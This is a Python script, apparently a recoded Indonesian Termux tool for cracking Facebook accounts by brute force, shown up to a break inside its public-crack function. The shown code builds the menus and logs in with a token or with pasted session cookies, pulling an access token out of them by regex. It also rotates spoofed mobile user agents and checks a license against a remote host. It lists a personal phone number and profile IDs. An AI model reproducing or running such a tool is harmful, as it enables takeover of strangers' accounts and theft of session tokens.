#Recode Memeg
import requests,bs4,sys,os,random,time,re,json,uuid,subprocess
from random import randint
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from bs4 import BeautifulSoup as par
from datetime import date
from datetime import datetime
from urllib.parse import quote
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
p = '\x1b[1;97m'
k = '\x1b[1;93m'
m = '\x1b[1;91m'
d = '\x1b[90;1m'
h = '\x1b[92;1m'
k = '\x1b[93;1m'
b = '\x1b[94;1m'
j = '\x1b[95;1m'
A = '\x1b[96;1m'
url_license = 'https://ngepetonline.000webhostapp.com/chek.php?project=testlicence&apikey='
host = "https://mbasic.facebook.com"
ok = []
cp = []
ttl = []
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "August", "09": "September", "10": "October", "11": "November", "12": "December"}
bulan = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"]
try:
    if bu < 0 or bu > 12:
        exit()
    buTemp = bu - 1
except ValueError:
    exit()
op = bulan[buTemp]
tanggal = ("%s-%s-%s"%(ha,op,ta))
ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_nokia   = 'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
ua_asus    = 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_huawei  = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_vivo    = 'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_oppo    = 'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_samsung = 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'
ua_windows = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
def jalan(z):
    for e in z + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.04)
def mlaku(z):
    for e in z + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)
def clear():
    if "linux" in sys.platform.lower():os.system("clear")
    elif "win" in sys.platform.lower():os.system("cls")
    else:os.system("clear")
def banner():
    print("""
\x1b[96;1m________               \x1b[92;1m_____ _____________________Team•XnxCode
\x1b[96;1m\______ \             \x1b[92;1m/     \\______   \_   _____/•Forced
 \x1b[96;1m|    |  \   ______  \x1b[92;1m/  \ /  \|    |  _/|    __)  •Brute
 \x1b[96;1m|    `   \ /_____/ \x1b[92;1m/    Y    \    |   \|     \   •Multi
\x1b[96;1m/_______  /         \x1b[92;1m\____|__  /______  /\___  /   •Dancok
        \x1b[96;1m\/                  \/       \/     \x1b[92;1m\/    
""")
def menu_log():
    os.system('rm -rf token.txt')
    clear()
    banner()
    var_menu()
    pmu = input('%s╠══[%s•%s] %sChoose : '%(H,O,H,K))
    print('%s║'%(H))
    if pmu in ['']:
        jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,H,M,H))
        menu_log()
    elif pmu in ['1','01','001','a']:
        defaultua()
        token = input('%s╚══[%s•%s] %sToken : '%(H,O,H,K))
        try:
            x = requests.get("https://graph.facebook.com/me?access_token=" + token)
            y = json.loads(x.text)
            n = y['name']
            xd = open("token.txt", "w")
            xd.write(token)
            xd.close()
            print('%s║'%(O))
            jalan('%s╚══[%s!%s] %sLogin Successful'%(O,P,O,P))
            exit(BeautifulSoup.main())
            menu()
        except (KeyError,IOError):
            print('%s║'%(H))
            jalan('%s╚══[%s!%s] %sToken Invalid'%(M,H,M,H))
            os.system('rm -rf token.txt')
            menu_log()
        except requests.exceptions.ConnectionError:
            print('%s║'%(H))
            jalan('%s╚══[%s!%s] %sConnection Problem'%(M,H,M,H))
            exit()
    elif pmu in ['2','02','002','b']:
        defaultua()
        cookie = input('%s╚══[%s•%s] %sCookies : '%(H,O,H,K))
        try:
            data = requests.get("https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_", headers = {
            "user-agent"                : "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36", # Jangan Di Ganti Ea Anjink.
            "referer"                   : "https://m.facebook.com/",
            "host"                      : "m.facebook.com",
            "origin"                    : "https://m.facebook.com",
            "upgrade-insecure-requests" : "1",
            "accept-language"           : "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "cache-control"             : "max-age=0",
            "accept"                    : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
            "content-type"              : "text/html; charset=utf-8"
            }, cookies = {
            "cookie"                    : cookie
            })
            find_token = re.search("(EAAA\w+)", data.text)
            hasil = "\n* Fail : maybe your cookie invalid !!" if (find_token is None) else "\n* Your fb access token : " + find_token.group(1)
            xd = open("token.txt", "w")
            xd.write(find_token.group(1))
            xd.close()
            print('%s║'%(H))
            jalan('%s╚══[%s!%s] %sLogin Successful'%(H,O,H,K))
            exit(BeautifulSoup.main())
            #menu()
        except requests.exceptions.ConnectionError:
            print('%s║'%(O))
            jalan('%s╚══[%s!%s] %sConnection Problem'%(M,H,M,H))
            exit()
        except (KeyError,IOError,AttributeError):
            print('%s║'%(H))
            jalan('%s╚══[%s!%s] %sCookies Invalid'%(M,H,M,H))
            os.system('rm -rf token.txt')
            menu_log()
    elif pmu in ['3','03','003','c']:
        clear()
        banner()
        var_tutor()
        pf = input('%s╠══[%s•%s] %sChoose : '%(H,O,H,K))
        print('%s║'%(H))
        if pf in ['']:
            jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,H,M,H))
            menu_log()
        elif pf in ['1','01','001','a']:
            os.system('xdg-open https://facebook.com/100028333393444')
            input('%s╚══[ %sReturn %s]%s'%(H,O,H,K))
            menu_log()
        elif pf in ['2','02','002','b']:
            os.system('xdg-open https://facebook.com/100028333393444')
            input('%s╚══[ %sReturn %s]%s'%(H,O,H,K))
            menu_log()
        elif pf in ['3','03','003','c']:
            os.system('xdg-open https://facebook.com/100028333393444')
            tutor_target()
            input('%s╚══[ %sReturn %s]%s'%(H,O,H,K))
            menu_log()
        elif pf in ['4','04','004','d']:
            tutor_crack()
            input('%s╚══[ %sReturn %s]%s'%(H,O,H,K))
            menu_log()
        else:
            jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,H,M,H))
            menu_log()
    elif pmu in ['4','04','004','d']:
        clear()
        banner()
        var_author()
        input('%s╚══[ %sReturn %s]%s'%(H,O,H,K))
        menu_log()
    elif pmu in ['0','00','000','e']:
        jalan('%s╠══[%s!%s] %sThank You For Using This SC'%(H,O,H,K))
        jalan('%s╚══[%s!%s] %sHave a Nice Day :)\n'%(H,O,H,K))
        os.system('rm -rf token.txt')
        clear()
        exit()
    else:
        jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,H,M,H))
        menu_log()
def menu():
    clear()
    banner()
    try:
        lisensi = open("license.txt","r").read()
        wl = requests.get(url_license + lisensi)
        wk = json.loads(wl.text)
        kun = lisensi.split('-')
        users = wk['username']
        mailerts = wk['email'].split('@')
        mailert1 = mailerts[0]
        mailert2 = mailerts[1]
        mailer = mailert1[:2]
        maile = (mailer+'xxxxx@'+mailert2)
        bergabung = wk['joined']
        kadaluarsa = wk['expired']
        status = ('%sPremium [%sPro%s]'%(H,O,H))
        kunci = ('%s%s%s-%s%s%s-%sXXXXX'%(O,kun[0],P,O,kun[1],P,O))
        pro = ''
        upgrade = 'Ganti License Key'
        jid = ''
    except (KeyError,IOError):
        status = 'P R O  E L I T E'
        users = 'Pricode Free'
        maile = 'hikmatgeheng@gmail.com'
        kunci = 'Kunci Pricode:v'
        bergabung = 'Pada Tahun 1945 Kemerdekaan Indonesia'
        kadaluarsa = 'Sampai Aku Jadi Milikmu><'
        pro = ("%s[%sPro%s]"%(H,O,H))
        upgrade = 'Upgrade To Version %sPro'
        jid = ('%s[%s9999 ID%s]'%(H,O,H))
    try:
        token = open("token.txt","r").read()
        x = requests.get("https://graph.facebook.com/me?access_token=" + token)
        y = json.loads(x.text)
        n = y['name']
        i = y['id']
    except (KeyError,IOError):
        print('%s╔══[ %sOh %s]%s'%(M,P,M,P))
        print('%s║'%(M))
        jalan('%s╚══[%s!%s] %sToken/Cookies Invalid'%(M,P,M,P))
        os.system('rm -rf token.txt')
        menu_log()
    except requests.exceptions.ConnectionError:
        print('%s╔══[ %sOh %s]%s'%(M,P,M,P))
        print('%s║'%(M))
        jalan('%s╚══[%s!%s] %sConnection Problem'%(M,P,M,P))
        exit()
    a = requests.get("http://ip-api.com/json/",headers={"Referer":"http://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}).json()
    try:
        ip = a["query"]
    except KeyError:
        ip = " "
    print('%s╔══[ %sWellcome To Tools Unfaedah:) %s %s]'%(H,K,n,H))
    print('%s║'%(H))
    print('%s╠══[%s•%s] %sID : %s'%(H,K,H,K,i))
    print('%s╠══[%s•%s] %sIP : %s'%(H,K,H,K,ip))
    print('%s║'%(H))
    print('%s╠══[%s•%s] %sStatus : %s'%(H,K,H,K,status))
    print('%s╠══[%s•%s] %sName : %s'%(H,K,H,K,users))
    print('%s╠══[%s•%s] %sEmail : %s'%(H,K,H,K,maile))
    print('%s╠══[%s•%s] %sKey : %s'%(H,K,H,K,kunci))
    print('%s╠══[%s•%s] %sJoin Since : %s'%(H,K,H,K,bergabung))
    print('%s╠══[%s•%s] %sValid until : %s'%(H,K,H,K,kadaluarsa))
    print('%s╠%s[!%s] %sNotice: Crack Itu Tergantung Hoki Ya Slurd Kalo Error Jan Salahin Sc Nya Bilang Langsung Ke Gw Kalo Ada Yang Error%s[!%s]'%(H,M,M,B,M,M))
    print('%s║'%(H))
    print('%s╠══[%s1%s] %sCrack Public/Teman %s'%(H,U,H,U,jid))
    print('%s╠══[%s2%s] %sCrack Follower/Pengikut %s'%(H,U,H,U,jid))
    print('%s╠══[%s3%s] %sCrack Like Postingan %s'%(H,U,H,U,jid))
    print('%s╠══[%s4%s] %sMengambil Data Target'%(H,U,H,U))
    print('%s╠══[%s5%s] %sDump ID %s'%(H,U,H,U,pro))
    print('%s╠══[%s6%s] %sLihat Hasil Crack %sCP%s/%sOK'%(H,U,H,U,K,P,H))
    print('%s╠══[%s7%s] %sCek Opsi Crack Checkpoint  %s'%(H,U,H,U,pro))
    print('%s╠══[%s8%s] %sUser Agent %sU%s/%sA'%(H,U,H,U,H,P,O))
    print('%s╠══[%s9%s] %s%s %s[ Tidak Bisa %s]'%(H,U,H,U,upgrade,M,M))
    print('%s╠══[%s10%s] %sIngfo Dari Author/Recode:v '%(H,U,H,U))
    print('%s╠══[%s11%s] %sJoin Grup Termux Bang '%(H,U,H,U))
    print('%s╠══[%s12%s] %sAdd Akun Gw Bang '%(H,U,H,U))
    print('%s╠══[%s13%s] %sJoin Grup Termux Whastapp '%(H,U,H,U))
    print('%s╠══[%s14%s] %sTambahin Kontak Whastapp Gw Bang %s[ Kek nya error ]'%(H,U,H,U,M))
    print('%s╠══[%s15%s] %sKumpulan %sU%s/%sA '%(H,U,H,U,H,P,B))
    #print('%s╠══[%s16%s] %sCrack Versi 2 %s[ Kek nya error ]'%(H,U,H,U,M))
    print('%s╠══[%s0%s] %sLog Out /Keluar/ '%(H,U,H,U))
    pm = input('%s╠══[%s•%s] %sChoose /Pilih Yang Mana?/: '%(H,M,O,K))
    print('%s║'%(H))
    if pm in ['']:
        jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,H,M,H))
        menu()
    elif pm in ['1','01','001','a']:
        publik()
    elif pm in ['2','02','002','b']:
        pengikut()
    elif pm in ['3','03','003','c']:
        likers()
    elif pm in ['4','04','004','d']:
        target()
    elif pm in ['5','05','005','e']:
        teman_target()
    elif pm in ['6','06','006','f']:
        hasil()
    elif pm in ['7','07','007','g']:
        cek_hasil()
    elif pm in ['8','08','008','h']:
        ugen()
    elif pm in ['9','09','009','i']:
        buy_license()
    elif pm in ['10','010','0010','k']:
    	ingfog()
    elif pm in ['11','011','0011','l']:
    	join()
    elif pm in ['12','012','0012','m']:
    	add()
    elif pm in ['13','013','0013','n']:
    	joinwa()
    elif pm in ['14','014','0014','o']:
    	kontakwa()
    elif pm in ['15','015','0015','p']:
    	ua()
    #elif pm in ['16','016','0016','q']:
    	___menu___()
    	___metode___()
    	___new___()
    	___old___()
    	___acak___()
    	___follower2___()
    	___follower___()
    	___very___()
    	___masal3___()
    	___masal2___()
    	___masal___()
    elif pm in ['0','00','000','j']:
        jalan('%s╚══[%s!%s] %sSampai Jumpa'%(H,O,H,K))
        os.system('rm -rf token.txt')
        menu_log()
    else:
        jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,H,M,H))
        menu()
def defaultua():
    ua = ua_nokia
    try:
        ugent = open('ugent.txt','w')
        ugent.write(ua)
        ugent.close()
    except (KeyError,IOError):
        menu_log()

#Kumpulan Ua#
def ua():
	mlaku("%sKumpulan U%s/%sA Ya Broo"%(H,P,B))
	mlaku(" 1. Mozilla/5.0 (Windows; U; Windows NT 6.0; de) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.27 Safari/525.13")
	mlaku(" 2. Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.27 Safari/525.13")
	mlaku(" 3. Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.13(KHTML, like Gecko) Chrome/0.2.149.27 Safari/525.13")
	mlaku(" 4. Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.27 Safari/525.13")
	mlaku(" 5. Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.27 Safari/525.13")
	mlaku(" 6. Mozilla/5.0 (Linux; U; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.27 Safari/525.13")
	mlaku(" 7. Mozilla/5.0 (Macintosh; U; Mac OS X 10_6_1; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/ Safari/530.5")
	mlaku(" 8. Mozilla/5.0 (Macintosh; U; Mac OS X 10_5_7; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/ Safari/530.5")
	mlaku(" 9. Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_6; -US) AppleWebKit/530.9 (KHTML, like Gecko) Chrome/ Safari/530.9")
	mlaku(" 10. Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_6; en-US) AppleWebKit/530.6 (KHTML, like Gecko) Chrome/ Safari/530.6")
	mlaku(" 11. Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_6; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/ Safari/530.5")
	mlaku(" 12. Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.27 Safari/525.13")
	mlaku(" 13. Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.29 Safari/525.13")
	mlaku(" 14. Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.29 Safari/525.13")
	mlaku(" 15. Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.29 Safari/525.13")
	mlaku(" 16. Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.30 Safari/525.13")
	mlaku(" 17. Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.30 Safari/525.13")
	mlaku(" 18. Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.6 Safari/525.13")
	mlaku(" 19. Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.6 Safari/525.13")
	mlaku(" 20. Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.2.151.0 Safari/525.19")
	mlaku(" %s[=] %sMau Ua Lebih Banyak Lagi? Chat Wa Gw >> %s083172526862%s <<"%(H,B,U,P))
	input('%s╚══[ %sKembali%s]%s'%(H,O,H,K))
	menu()
def buy_license():
	print("%sMenu Ini Tidak Bisa Dipakai"%(M))
	input('%s╚══[ %sKembali%s]%s'%(H,O,H,K))
	menu()
#Tambahin Kontak Gw Bang
def kontakwa():
	print(" %s[!] Jan di Kirim Virtex Anjing"%(B))
	os.system('xdg-open https://chat.whatsapp.com/+62 831-7252-6862')
	input('%s╚══[ %sKembali%s]%s'%(H,O,H,K))
	menu()
#Join Grup Whatsapp bang
def joinwa():
	print("%s[!] Lu Kalo Mau Join Join Aja Jangan Rusuh,Kirim Virtex Apalagi"%(H))
	os.system('xdg-open https://chat.whatsapp.com/COcn9ncnjbBCeHBgzJk3Gs')
	input('%s╚══[ %sKembali%s]%s'%(H,O,H,K))
	menu()
#Add Akun Gw
def add():
	print("%s╚══%s[%s!%s] %sAdd Akun Gw Bang Tapi Jangan Diriport Juga Yah"%(H,B,U,H,K))
	os.system('xdg-open https://www.facebook.com/profile.php?id=100028333393444')
	input('%s╚══[ %sKembali%s]%s'%(H,O,H,K))
	menu()
#Join Grup Termox
def join():
	print("%s╠══%sSilahkan Yang Belum Join Join Ya Kalo Enggak Gpp Saya Gk Maksa"%(B,H))
	os.system('xdg-open https://facebook.com/groups/221877543390653/')
	input('%s╚══[ %sKembali%s]%s'%(H,O,H,K))
	menu()
#Ingfo
def ingfog():
	mlaku("%s╠═════════════════════════════════════════════════════════════════╗"%(K))
	mlaku("%s╠══%s[%s1%s] %sMethode Yang Enak/Tidak Enak"%(B,H,K,H,U))
	mlaku("%s╠%s[%s!%s] %sMethode B-Api Lumayan Enak Tapi Sering Kena Spam"%(B,H,K,H,U))
	mlaku("%s╠%s[%s!%s] %sMethode Mbasic  Enak Tapi Crack Lambat"%(B,H,K,H,U))
	mlaku("%s╠%s[%s!%s] %sMethode Free FB Sangat Enak Tapi Crack Sangat Lambat"%(B,H,K,H,U))
	mlaku("%s╠══%s[%s2%s] %sDirecode/Ubah Pada Kamis 10 Desember 2021"%(B,H,K,H,U))
	mlaku("%s╠══%s[%s3%s] %sAuthor Asli/Recode"%(B,H,K,H,U))
	mlaku("%s╠══%s[%s-%s] %sAuthor%s[%s-%s]"%(B,H,K,H,U,H,K,H))
	mlaku("%s╠%s[%s+%s] %sDapunta><"%(B,H,K,H,U))
	mlaku("%s╠%s[%s+%s] %sRizal><"%(B,H,K,H,U))
	mlaku("%s╠══%s[%s-%s] %sRecode%s[%s-%s]"%(B,H,K,H,U,H,K,H))
	mlaku("%s╠ %s[%s+%s] %sHikmat Gans><"%(B,H,K,H,U))
	mlaku("%s╠%s[%s+%s] %sPutri Cans><"%(B,H,K,H,U))
	mlaku("%s╠%s[%s+%s] %sNdrii Gans><"%(B,H,K,H,U))
	mlaku("%s╠══%s[%s-%s] %sTeman Gw%s[%s-%s]"%(B,H,K,H,U,H,K,H))
	mlaku("%s╠%s[%s+%s] %sFais Gans><"%(B,H,K,H,U))
	mlaku("%s╠%s[%s+%s] %sYoga Gans><"%(B,H,K,H,U))
	mlaku("%s╠%s[%s+%s] %sJeeck Gans><"%(B,H,K,H,U))
	mlaku("%s╠%s[%s+%s] %sAkhmad Gans><"%(B,H,K,H,U))
	mlaku("%s╠%s[%s+%s] %sYummee Gans><"%(B,H,K,H,U))
	mlaku("%s╠%s[%s+%s] %sDika Gans><"%(B,H,K,H,U))
	mlaku("%s╠%s[%s+%s] %sHikari Cans><"%(B,H,K,H,U))
	mlaku("%s╠%s[%s+%s] %sAdzi Gans><"%(B,H,K,H,U))
	mlaku("%s╠%s[%s+%s] %sKuhaku Gans><"%(B,H,K,H,U))
	mlaku("%s╠%s[%s+%s] %sSanz Gans><"%(B,H,K,H,U))
	mlaku("%s╠%s[%s+%s] %sFachri Gans><"%(B,H,K,H,U))
	mlaku("%s╠%s[%s+%s] %sEzaa Gans><"%(B,H,K,H,U))
	mlaku("%s╠%s[%s+%s] %sAngga Gans><"%(B,H,K,H,U))
	mlaku("%s╠%s[%s+%s] %sRamadhian Gans><"%(B,H,K,H,U))
	mlaku("%s╠%s[%s+%s] %sMas Akbar Gans><"%(B,H,K,H,U))
	mlaku("%s╠%s[%s+%s] %sJay Gans><"%(B,H,K,H,U))
	mlaku("%s╠%s[%s+%s] %sBintang Gans><"%(B,H,K,H,U))
	mlaku("%s╠══%s[%s-%s] %sSaran Dari Gw%s[%s-%s]"%(B,H,K,H,U,H,K,H))
	mlaku("%s╠%s[%s+%s] %sKalo Sc Ini Error Bilang Ke Gw Chat Aja Wa Gw Nih No Wa Gw>> 083172526862><"%(B,H,K,H,U))
	mlaku("%s╠══%s[%s-%s] %sThanks To%s[%s-%s]"%(B,H,K,H,U,H,K,H))
	mlaku("%s╠══%s[%s-%s] %sAuthor%s[%s-%s]"%(B,H,K,H,U,H,K,H))
	mlaku("%s╠%s[%s+%s] %sDapunta><"%(B,H,K,H,U))
	mlaku("%s╠%s[%s+%s] %sRizal><"%(B,H,K,H,U))
	mlaku("%s╠══%s[%s-%s] %sRecode%s[%s-%s]"%(B,H,K,H,U,H,K,H))
	mlaku("%s╠ %s[%s+%s] %sHikmat Gans><"%(B,H,K,H,U))
	mlaku("%s╠%s[%s+%s] %sPutri Cans><"%(B,H,K,H,U))
	mlaku("%s╠%s[%s+%s] %sNdrii Gans><"%(B,H,K,H,U))
	mlaku("%s╠══%s[%s-%s] %sTeman Gw TeamXnxCode%s[%s-%s]"%(B,H,K,H,U,H,K,H))
	mlaku("%s╠%s[%s+%s] %sFais Gans><"%(B,H,K,H,U))
	mlaku("%s╠%s[%s+%s] %sYoga Gans><"%(B,H,K,H,U))
	mlaku("%s╠%s[%s+%s] %sJeeck Gans><"%(B,H,K,H,U))
	mlaku("%s╠%s[%s+%s] %sAkhmad Gans><"%(B,H,K,H,U))
	mlaku("%s╠%s[%s+%s] %sYummee Gans><"%(B,H,K,H,U))
	mlaku("%s╠%s[%s+%s] %sDika Gans><"%(B,H,K,H,U))
	mlaku("%s╠%s[%s+%s] %sHikari Cans><"%(B,H,K,H,U))
	mlaku("%s╠%s[%s+%s] %sAdzi Gans><"%(B,H,K,H,U))
	mlaku("%s╠%s[%s+%s] %sKuhaku Gans><"%(B,H,K,H,U))
	mlaku("%s╠%s[%s+%s] %sSanz Gans><"%(B,H,K,H,U))
	mlaku("%s╠%s[%s+%s] %sFachri Gans><"%(B,H,K,H,U))
	mlaku("%s╠%s[%s+%s] %sEzaa Gans><"%(B,H,K,H,U))
	mlaku("%s╠%s[%s+%s] %sAngga Gans><"%(B,H,K,H,U))
	mlaku("%s╠%s[%s+%s] %sRamadhian Gans><"%(B,H,K,H,U))
	mlaku("%s╠%s[%s+%s] %sMas Akbar Gans><"%(B,H,K,H,U))
	mlaku("%s╠%s[%s+%s] %sJay Gans><"%(B,H,K,H,U))
	mlaku("%s╠%s[%s+%s] %sBintang Gans><"%(B,H,K,H,U))
	mlaku("%s╠═════════════════════════════════════════════════════════════════╝"%(H))
	input('%s╚══[ %sKembali%s]%s'%(H,O,H,K))
	menu()
def ugen():
    var_ugen()
    pmu = input('%s╠══[%s•%s] %sChoose /Pilih/: '%(H,O,H,K))
    print('%s║'%(O))
    if pmu in[""]:
        jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,H,M,H))
        menu()
    elif pmu in ['1','01','001','a']:
        os.system('xdg-open https://www.google.com/search?q=My+User+Agent&oq=My+User+Agent&aqs=chrome..69i57j0l3j0i22i30l6.4674j0j1&sourceid=chrome&ie=UTF-8')
        input('%s╚══[ %sBack %s]%s'%(H,O,H,K))
        menu()
    elif pmu in ['2','02','002','b']:
        os.system("rm -rf ugent.txt")
        ua = input("%s╚══[%s•%s] %sEnter User Agent : \n\n"%(H,O,H,K))
        try:
            ugent = open('ugent.txt','w')
            ugent.write(ua)
            ugent.close()
            jalan("\n%s╔══[ %sSukses Ganti User Agent %s]"%(H,O,H))
            print('%s║'%(O))
            input('%s╚══[ %sKembali %s]%s'%(H,O,H,K))
            menu()
        except (KeyError,IOError):
            jalan("\n%s╔══[ %sGagal Ganti User Agent %s]"%(M,H,M))
            print('%s║'%(M))
            input('%s╚══[ %sKembali%s]%s'%(M,H,M,H))
            menu()
    elif pmu in ['3','03','003','c']:
        ugen_hp()
    elif pmu in ['4','04','004','d']:
        os.system("rm -rf ugent.txt")
        jalan("%s╠══[ %sUser Agent Sukses Menghapus %s]"%(H,O,H))
        print('%s║'%(O))
        input('%s╚══[ %sKembali %s]%s'%(H,O,H,K))
        menu()
    elif pmu in ['5','05','005','e']:
        try:
            ungser = open('ugent.txt', 'r').read()
        except (KeyError,IOError):
            ungser = 'Not Found'
        print("%s╚══[%s•%s] %sYour User Agent  : \n\n%s%s"%(H,O,H,O,K,ungser))
        jalan("\n%s╔══[ %sThis is your current user agent %s]"%(H,O,H))
        print('%s║'%(O))
        input('%s╚══[ %sKembali%s]%s'%(H,O,H,K))
        menu()
    elif pmu in ['0','00','000','f']:
        menu()
    else:
        jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,H,M,H))
def ugen_hp():
    os.system("rm -rf ugent.txt")
    print('%s╠══[%s1%s] %sXiaomi'%(H,O,H,K))
    print('%s╠══[%s2%s] %sNokia'%(H,O,H,U))
    print('%s╠══[%s3%s] %sAsus'%(H,O,H,P))
    print('%s╠══[%s4%s] %sHuawei'%(H,O,H,M))
    print('%s╠══[%s5%s] %sVivo'%(H,O,H,B))
    print('%s╠══[%s6%s] %sOppo'%(H,O,H,O))
    print('%s╠══[%s7%s] %sSamsung'%(H,B,O,H))
    print('%s╠══[%s8%s] %sWindows'%(H,P,O,H))
    pc = input('%s╠══[%s•%s] %sChoose /Pilih/: '%(H,O,H,K))
    print('%s║'%(O))
    if pc in['']:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,H,M,H));menu()
    elif pc in ['1','01']:
        ugent = open('ugent.txt','w');ugent.write(ua_xiaomi);ugent.close()
    elif pc in ['2','02']:
        ugent = open('ugent.txt','w');ugent.write(ua_nokia);ugent.close()
    elif pc in ['3','03']:
        ugent = open('ugent.txt','w');ugent.write(ua_asus);ugent.close()
    elif pc in ['4','04']:
        ugent = open('ugent.txt','w');ugent.write(ua_huawei);ugent.close()
    elif pc in ['5','05']:
        ugent = open('ugent.txt','w');ugent.write(ua_vivo);ugent.close()
    elif pc in ['6','06']:
        ugent = open('ugent.txt','w');ugent.write(ua_oppo);ugent.close()
    elif pc in ['7','07']:
        ugent = open('ugent.txt','w');ugent.write(ua_samsung);ugent.close()
    elif pc in ['8','08']:
        ugent = open('ugent.txt','w');ugent.write(ua_windows);ugent.close()
    else:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,H,M,H));menu()
    jalan("%s╠══[ %s Sukses Mengganti User Agent %s]"%(H,O,H))
    print('%s║'%(O))
    input('%s╚══[ %sKembali %s]%s'%(H,O,H,K))
    menu()
def publik():
    try:
        lisensi = open("license.txt","r").read()
        wl = requests.get(url_license + lisensi)
        wk = json.loads(wl.text)
        wj = wk['username']
        jid = '5000'
    except (KeyError,IOError):
        jid = '5000'
    except requests.exceptions.ConnectionError:
        jalan('%s╚══[%s!%s] %sKoneksi Bermasalah'%(M,H,M,H))
        exit()
    try:
        token = open("token.txt","r").read()
        x = requests.get("https://graph.facebook.com/me?access_token=" + token)
        y = json.loads(x.text)
